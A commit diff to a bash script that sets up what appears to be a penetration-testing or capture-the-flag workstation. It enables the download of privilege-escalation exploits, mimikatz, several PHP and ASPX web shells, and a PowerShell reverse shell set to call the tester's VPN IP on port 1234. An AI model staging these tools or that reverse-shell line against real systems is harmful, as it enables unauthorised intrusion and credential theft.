5d6f244fe3b0bc7309759874e04493c0e23a08cd
Christopher Soehnlein <admin@islanddog.ky>
2021-06-23 10:24:20 -0500

    Update www.sh

--- www.sh
+++ www.sh
@@ -10,7 +10,7 @@ echo ""
 echo "Please input the current box IP"
 read  box
 echo "Current Box IP - $box"
-#mkdir www smb ssh results
+mkdir www smb ssh results
 echo ""
 echo -e "\e[41mNOTICE\e[0m"
 echo "The majority of tools and updates are commented out to save time during day to day. This will be improved to a menu layout in the future."
@@ -20,32 +20,32 @@ echo ""
 sudo echo "Run with SUDO"
 echo ""
 echo -e "\e[41mTools Installation\e[0m"
-#sudo curl https://sh.rustup.rs -sSf | sh
+sudo curl https://sh.rustup.rs -sSf | sh
 cargo install rustscan
 cargo install feroxbuster
-#sudo apt install seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
-#sudo pipx install git+https://github.com/Tib3rius/AutoRecon.git
-#sudo pip install one-lin3r
+sudo apt install seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
+sudo pipx install git+https://github.com/Tib3rius/AutoRecon.git
+sudo pip install one-lin3r
 echo  -e "\e[41mDownloading Useful & Creating SSH Keys\e[0m"
 rm -rf useful
 git clone https://github.com/islanddog/notes.git temp && mv temp/useful . && rm -rf temp
 sed -i "s/10.0.0.1/$vpnip/g" useful
-#sed -i "s/10.10.10.97/$box/g" useful
-#cd ssh
-#ssh-keygen -t rsa -f id_rsa -q -P ""
-#cd ..
+sed -i "s/10.10.10.97/$box/g" useful
+cd ssh
+ssh-keygen -t rsa -f id_rsa -q -P ""
+cd ..
 cat ssh/id_rsa.pub
-#echo ""
-#echo -e "\e[41mPulling Windows Exploits\e[0m"
-#git clone https://github.com/SecWiki/windows-kernel-exploits.git win-exploits
-#cd win-exploits && rm -rf .git
-#wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-#cd ..
-#echo ""
-#echo -e "\e[41mDownloading Enum Scripts.\e[0m"
-#git clone https://github.com/s0md3v/Arjun arjun
-#git clone https://github.com/dreadlocked/Drupalgeddon2 Drupalgeddon2
-#git clone https://github.com/quentinhardy/odat.git oracle
+echo ""
+echo -e "\e[41mPulling Windows Exploits\e[0m"
+git clone https://github.com/SecWiki/windows-kernel-exploits.git win-exploits
+cd win-exploits && rm -rf .git
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+cd ..
+echo ""
+echo -e "\e[41mDownloading Enum Scripts.\e[0m"
+git clone https://github.com/s0md3v/Arjun arjun
+git clone https://github.com/dreadlocked/Drupalgeddon2 Drupalgeddon2
+git clone https://github.com/quentinhardy/odat.git oracle
 cd www
 rm -rf privesc
 git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries privesc
@@ -60,33 +60,33 @@ find ./ -name '*.bat' -exec cp -prv '{}' '../privesc/' ';'
 find ./ -name '*.rb' -exec cp -prv '{}' '../privesc/' ';'
 cd ..
 rm -rf temp
-#cd privesc
-#rm -rf .git
-#wget https://gist.githubusercontent.com/islanddog/c77b4567e1569c185d40e2decf02ca63/raw/e9096bbba8d44de315a15cd28b2895ffec1cc6a7/echo-cscript
-#wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
-#wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
-#cd ..
-#mkdir mimikatz
-#cd mimikatz
-#wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
-#unzip mimikatz_trunk.zip && rm -rf mimikatz_trunk.zip
-#cd ..
-#echo ""
-#echo -e "\e[41mPulling WebShells\e[0m"
-#mkdir webshells
-#git clone https://github.com/ivan-sincek/php-reverse-shell.git tmp
-#cd tmp
-#find ./ -name '*.php' -exec cp -prv '{}' '../webshells/' ';'
-#cd ..
-#sudo rm -rf tmp
-#cd webshells
-#wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
-#wget https://github.com/tennc/webshell/raw/master/aspx/wso.aspx
-#wget https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php
-#wget https://gist.githubusercontent.com/islanddog/f20e0ca0e9cef1d70110a8d781eeaa28/raw/4206911d39aaeed7306b701d5e1cc1d13cb54ffa/uploader.php
-#wget -O p0wny.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
-#echo Invoke-PowerShellTcp -Reverse -IPAddress $vpnip -Port 1234 >> Invoke-PowerShellTcp.ps1
-#cd ..
+cd privesc
+rm -rf .git
+wget https://gist.githubusercontent.com/islanddog/c77b4567e1569c185d40e2decf02ca63/raw/e9096bbba8d44de315a15cd28b2895ffec1cc6a7/echo-cscript
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+cd ..
+mkdir mimikatz
+cd mimikatz
+wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
+unzip mimikatz_trunk.zip && rm -rf mimikatz_trunk.zip
+cd ..
+echo ""
+echo -e "\e[41mPulling WebShells\e[0m"
+mkdir webshells
+git clone https://github.com/ivan-sincek/php-reverse-shell.git tmp
+cd tmp
+find ./ -name '*.php' -exec cp -prv '{}' '../webshells/' ';'
+cd ..
+sudo rm -rf tmp
+cd webshells
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+wget https://github.com/tennc/webshell/raw/master/aspx/wso.aspx
+wget https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php
+wget https://gist.githubusercontent.com/islanddog/f20e0ca0e9cef1d70110a8d781eeaa28/raw/4206911d39aaeed7306b701d5e1cc1d13cb54ffa/uploader.php
+wget -O p0wny.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+echo Invoke-PowerShellTcp -Reverse -IPAddress $vpnip -Port 1234 >> Invoke-PowerShellTcp.ps1
+cd ..
 rm -rf shells && mkdir shells
 cd shells
 echo ""
